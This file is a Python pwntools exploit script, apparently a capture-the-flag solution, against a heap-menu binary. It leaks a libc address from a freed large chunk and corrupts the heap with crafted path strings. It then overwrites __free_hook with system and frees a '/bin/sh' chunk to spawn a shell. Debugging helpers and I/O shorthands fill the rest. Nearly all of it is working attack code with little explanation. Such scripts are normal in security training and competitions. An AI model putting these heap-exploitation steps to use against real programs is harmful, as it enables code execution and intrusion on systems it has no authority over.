#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000002290, 0x00000000000030F0, 0x00000000000026D6]


def add(idx, size, path):
    sll('1')
    sll(str(idx))
    sll(str(size))
    sll(path)

def check(idx):
    sll('2')
    sll(str(idx))

def show(idx):
    sll('3')
    sll(str(idx))


def dele(idx):
    sll('4')
    sll(str(idx))


def exp():

    add(0, 0x580, 'a' * 0x80)
    add(1, 0x10, '/bin/sh\x00')
    dele(0)
    add(0, 0x580, '')
    show(0)
    ru("[+] Path : ")
    leak = u64(re(8, 2))
    free_hook = leak + 0x1ce8
    libc = free_hook - 0x3ed8e8
    print(hex(leak))
    print(hex(free_hook))

    add(2, 0x40, 'a')
    add(3, 0x40, 'a')
    add(4, 0x80, 'a')
    add(5, 0x80, 'a')

    dele(2)
    dele(3)
    dele(5)

    payload1 = flat('~', p8(0xff) * 0x10, '\\', 'u' * 0x30, '/', 'e' * (0x8-1), '!\x01',  '/', 'f' * 0x5)
    add(9, len(payload1), payload1)
    check(9)

    dele(4)

    add(6, 0x110, flat('a' * 0x80, 0, 0x90, free_hook))

    add(7, 0x80, 'a' * 0x10)
    system = libc + 0x4f550
    add(8, 0x80, flat(system))
    dele(1)


def exp1():
    payload1 = flat('~', 'd' * 0x10, '\\', 'u'*0x30, '/', 'e' * (0x30-1), '/', 'filename')
    add(0, len(payload1), payload1)
    gdba()
    check(0)


context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./bin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote( )

elf = ELF('./bin')

def gdba():
    if local == 0:
        return 0;
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base =int(os.popen("pmap {}|grep bin |awk '{{print $1}}'".format(cn.pid)).readlines()[1],16)
        cmd +=''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd +='set $base={:#x}\n'.format(base)
        cmd +='dir src/'
        slog['base'] = base	
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
    gdb.attach(cn,cmd)

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(">> ", x)
# after a, send b;
from pwnlib.util import cyclic
ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp1()

slog_show()

ia()

